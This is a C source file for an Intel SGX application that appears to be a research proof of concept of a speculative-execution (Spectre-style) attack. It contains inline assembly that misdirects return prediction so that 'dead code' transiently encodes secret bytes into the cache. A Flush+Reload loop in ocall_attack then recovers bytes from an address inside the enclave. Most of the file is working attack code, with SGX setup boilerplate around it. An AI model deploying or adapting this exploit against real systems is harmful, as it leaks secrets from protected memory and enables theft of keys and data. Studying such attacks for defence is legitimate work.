#include <stdio.h>
#include <string.h>
#include <assert.h>

# include <unistd.h>
# include <pwd.h>

#include "sgx_urts.h"
#include "App.h"
#include "Enclave_u.h"

#include "libcache/cacheutils.h"

//#define DEBUG_PRINT
//#define TESTING
#define DATA "__________________"
#define SECRET "INACCESSIBLESECRET"

int idx;
char* secret_data;

/* Global EID shared by multiple threads */
sgx_enclave_id_t global_eid = 0;

typedef struct _sgx_errlist_t {
    sgx_status_t err;
    const char *msg;
    const char *sug; /* Suggestion */
} sgx_errlist_t;

/* Error code returned by sgx_create_enclave */
static sgx_errlist_t sgx_errlist[] = {
    {
        SGX_ERROR_UNEXPECTED,
        "Unexpected error occurred.",
        NULL
    },
    {
        SGX_ERROR_INVALID_PARAMETER,
        "Invalid parameter.",
        NULL
    },
    {
        SGX_ERROR_OUT_OF_MEMORY,
        "Out of memory.",
        NULL
    },
    {
        SGX_ERROR_ENCLAVE_LOST,
        "Power transition occurred.",
        "Please refer to the sample \"PowerTransition\" for details."
    },
    {
        SGX_ERROR_INVALID_ENCLAVE,
        "Invalid enclave image.",
        NULL
    },
    {
        SGX_ERROR_INVALID_ENCLAVE_ID,
        "Invalid enclave identification.",
        NULL
    },
    {
        SGX_ERROR_INVALID_SIGNATURE,
        "Invalid enclave signature.",
        NULL
    },
    {
        SGX_ERROR_OUT_OF_EPC,
        "Out of EPC memory.",
        NULL
    },
    {
        SGX_ERROR_NO_DEVICE,
        "Invalid SGX device.",
        "Please make sure SGX module is enabled in the BIOS, and install SGX driver afterwards."
    },
    {
        SGX_ERROR_MEMORY_MAP_CONFLICT,
        "Memory map conflicted.",
        NULL
    },
    {
        SGX_ERROR_INVALID_METADATA,
        "Invalid enclave metadata.",
        NULL
    },
    {
        SGX_ERROR_DEVICE_BUSY,
        "SGX device was busy.",
        NULL
    },
    {
        SGX_ERROR_INVALID_VERSION,
        "Enclave version was invalid.",
        NULL
    },
    {
        SGX_ERROR_INVALID_ATTRIBUTE,
        "Enclave was not authorized.",
        NULL
    },
    {
        SGX_ERROR_ENCLAVE_FILE_ACCESS,
        "Can't open enclave file.",
        NULL
    },
    {
        SGX_ERROR_NDEBUG_ENCLAVE,
        "The enclave is signed as product enclave, and can not be created as debuggable enclave.",
        NULL
    },
    {
        SGX_ERROR_MEMORY_MAP_FAILURE,
        "Failed to reserve memory for the enclave.",
        NULL
    },
};

/* Check error conditions for loading enclave */
void print_error_message(sgx_status_t ret)
{
    size_t idx = 0;
    size_t ttl = sizeof sgx_errlist/sizeof sgx_errlist[0];

    for (idx = 0; idx < ttl; idx++) {
        if(ret == sgx_errlist[idx].err) {
            if(NULL != sgx_errlist[idx].sug)
                printf("Info: %s\n", sgx_errlist[idx].sug);
            printf("Error: %s\n", sgx_errlist[idx].msg);
            break;
        }
    }
    
    if (idx == ttl)
        printf("Error: Unexpected error occurred.\n");
}

/* Initialize the enclave:
 *   Call sgx_create_enclave to initialize an enclave instance
 */
int initialize_enclave(void)
{
    sgx_status_t ret = SGX_ERROR_UNEXPECTED;
    
    /* Call sgx_create_enclave to initialize an enclave instance */
    /* Debug Support: set 2nd parameter to 1 */
    ret = sgx_create_enclave(ENCLAVE_FILENAME, SGX_DEBUG_FLAG, NULL, NULL, &global_eid, NULL);
    if (ret != SGX_SUCCESS) {
        print_error_message(ret);
        return -1;
    }

    return 0;
}

/* OCall functions */
void ocall_print_string(const char *str)
{
    /* Proxy/Bridge will check the length and null-terminate 
     * the input string to prevent buffer overflow. 
     */

    printf("%s", str);
}


__attribute__((naked)) void slow_return(void* target){
  asm volatile (
    "1:\n\t"
    "pop %%rax\n\t"
    "cmp %[target], (%%rsp)\n\t"
    "jne 1b\n\t"
    "mov %[target], (%%rsp)"
    :
    : [target] "r" (target)
    : "rax", "memory"
  );

  asm volatile (
    "mov $2147476866, %%rcx\n\t"
    "mov $1792388078, %%rax\n\t"
    "mov $1983325987, %%rdx\n\t"
    "div %%ecx\n\t"
    "div %%ecx\n\t"
    "div %%ecx\n\t"
    "div %%ecx\n\t"
    "div %%ecx\n\t"
    "div %%ecx\n\t"
    "sub $512, %%rdx\n\t"
    "add %%rdx, (%%rsp)\n\t"
    "ret\n\t"
    :
    :
    : "rax", "rcx", "rdx", "memory"
  );

  return;
}

__attribute__((naked)) void speculate(){
  register void* arg asm("rdi");  // bind C variable to rdi

    asm volatile (
        ".intel_syntax noprefix\n\t"
        "mov %0, [rsp]\n\t"
        ".att_syntax\n\t"
        : "=r" (arg)
    );

  // Will return directly in callee of speculate
  slow_return(arg);
   
  // --- dead code ---
  // access and cache encode here
  cache_encode(secret_data[idx]);

  //printf("Dead code, should not be printed!\n");

  asm volatile ("ret\n\t":::);
}

int __attribute__ ((noinline)) call_start() {
  // slow_return will return directly here
  speculate();
  return 1;
}

char * create_secret() {
  // allocate secret
char* secret = (char*)malloc(sizeof(char) * 128);

  if(secret == NULL) {
    printf("allocation of secret failed\n");
  }
  memcpy(secret, SECRET, sizeof(SECRET));

  return secret;
}

char * create_public() {
    char* public_data = (char*)malloc(sizeof(DATA)+1);

    if(public_data == NULL) {
        printf("allocation of public failed\n");
    }

    memcpy(public_data, DATA, sizeof(DATA));

    return public_data;
}

void ocall_attack(uint64_t addr){
    pagesize = 4096;
    if(!CACHE_MISS)
        CACHE_MISS = detect_flush_reload_threshold();
    
#ifdef DEBUG_PRINT
    printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
#endif

    char *_mem = (char*)malloc(pagesize * (256 + 4));
    mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
    memset(mem, 0, pagesize * 256);


#ifdef TESTING
    secret_data = create_secret();
#else
    secret_data = (char*)addr;
#endif

#ifdef DEBUG_PRINT
    printf("Public %p, Secret %p, Offset: %llx \n", public_data, secret_data, offset);
#endif
    
    flush_shared_memory();

    // nothing leaked so far
    char leaked[sizeof(SECRET) + 1];
    memset(leaked, ' ', sizeof(leaked));
    leaked[sizeof(SECRET)] = 0;
    
    idx = 0;
    int c = 0;
    int score = 0;

#ifdef TESTING
    #define MAXITER 10000
#else
    #define MAXITER 100000
#endif

    while (1 && c != MAXITER) {
        c++;
        
        call_start();

        // Recover data from covert channel
        cache_decode_pretty(leaked, idx);

        if (leaked[idx] == SECRET[idx]){
            score++;
        }
        leaked[idx] = ' ';

        // for every byte in the string
        idx = (idx + 1) % (sizeof(SECRET) - 1);
    }

    printf("%d, %d", c, score);
    if (score > 0){
        printf(" <--\n");
    }else{
        printf("\n");
    }

}

/* Application entry */
int SGX_CDECL main(int argc, char *argv[])
{
    (void)(argc);
    (void)(argv);
    uint64_t result = 0;

#ifdef DEBUG_PRINT
    printf("Start up!\n");
#endif

    /* Initialize the enclave */
    if(initialize_enclave() < 0){
        printf("Enter a character before exit ...\n");
        getchar();
        return -1; 
    }

    sgx_status_t status = ecall_start_victim(global_eid, &result);
    if (status != SGX_SUCCESS) {
        printf("ERROR: ECall failed\n");
        print_error_message(status);
        printf("Enter a character before exit ...\n");
        getchar();
        return -1;
    } 



    /* Destroy the enclave */
    sgx_destroy_enclave(global_eid);

#ifdef DEBUG_PRINT
    printf("Info: Measurement completed.\n");
#endif

    if ( 0 == result) {
#ifdef DEBUG_PRINT
	    printf("Info: All test passed.\n");
#endif
    } else {
        printf("ERROR: ....\n");
    }
    //printf("Enter a character before exit ...\n");
    //getchar();
    return 0;
}